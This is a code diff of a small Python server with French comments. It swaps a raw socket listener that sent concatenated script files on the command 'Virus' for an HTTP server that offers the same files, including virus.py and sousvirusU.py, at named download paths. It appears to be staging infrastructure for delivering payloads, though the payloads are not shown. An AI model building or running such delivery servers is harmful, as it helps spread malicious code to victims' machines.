@@ -1,43 +1,61 @@
-import socket
+import http.server
+import socketserver
 
-host, port = ('',5566)
+PORT = 8000
 
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.bind((host,port))
-print("serveur on...")
+class RequestHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/data':
+            filename = 'data.txt' # Remplacez 'nom_de_votre_fichier.ext' par le nom de votre fichier et son extension
+            with open(filename, 'rb') as file:
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('Content-Disposition', 'attachment; filename=' + filename)
+                self.end_headers()
+                self.wfile.write(file.read())
+        elif self.path == '/compteur':
+            filename = 'compteur.py' # Remplacez 'nom_de_votre_fichier.ext' par le nom de votre fichier et son extension
+            with open(filename, 'rb') as file:
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('Content-Disposition', 'attachment; filename=' + filename)
+                self.end_headers()
+                self.wfile.write(file.read())
+        elif self.path == '/popup':
+            filename = 'popup.py' # Remplacez 'nom_de_votre_fichier.ext' par le nom de votre fichier et son extension
+            with open(filename, 'rb') as file:
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('Content-Disposition', 'attachment; filename=' + filename)
+                self.end_headers()
+                self.wfile.write(file.read())
+        elif self.path == '/sousvirusU':
+            filename = 'sousvirusU.py' # Remplacez 'nom_de_votre_fichier.ext' par le nom de votre fichier et son extension
+            with open(filename, 'rb') as file:
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('Content-Disposition', 'attachment; filename=' + filename)
+                self.end_headers()
+                self.wfile.write(file.read())
+        elif self.path == '/virus':
+            filename = 'virus.py' # Remplacez 'nom_de_votre_fichier.ext' par le nom de votre fichier et son extension
+            with open(filename, 'rb') as file:
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('Content-Disposition', 'attachment; filename=' + filename)
+                self.end_headers()
+                self.wfile.write(file.read())
+        elif self.path == '/download':
+            filename = 'download.py' # Remplacez 'nom_de_votre_fichier.ext' par le nom de votre fichier et son extension
+            with open(filename, 'rb') as file:
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('Content-Disposition', 'attachment; filename=' + filename)
+                self.end_headers()
+                self.wfile.write(file.read())
+        else:
+            super().do_GET()
 
-while True:
-    socket.listen()
-    conn, address = socket.accept()
-    print("En ecoute..")
-
-    data = conn.recv(4096)
-    data = data.decode("utf8")
-    print(data)
-    if data == "Test":
-        conn.sendall("Test recu".encode("utf8"))
-    if data == "Virus":
-        fic = open("virus.py","r")
-        dataV = fic.read()
-        fic.close()
-        fic = open("sousvirusW.py","r")
-        dataSVW = fic.read()
-        fic.close() 
-        fic = open("data.txt","r")
-        dataD = fic.read()
-        fic.close() 
-        fic = open("compteur.py","r")
-        dataC = fic.read()
-        fic.close() 
-        fic = open("popup.py","r")
-        dataP = fic.read()
-        fic.close() 
-        fic = open("sousvirusU.py","r")
-        dataSVU = fic.read()
-        fic.close() 
-        data = dataV + "[|]" + dataSVW + "[|]" + dataD + "[|]" + dataC + "[|]" + dataP + "[|]" + dataSVU
-        conn.sendall(data.encode("utf8"))
-        print("envoyé")
-
-conn.close()
-socket.close()
+with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
+    print("Serveur actif sur le port :", PORT)
+    httpd.serve_forever()
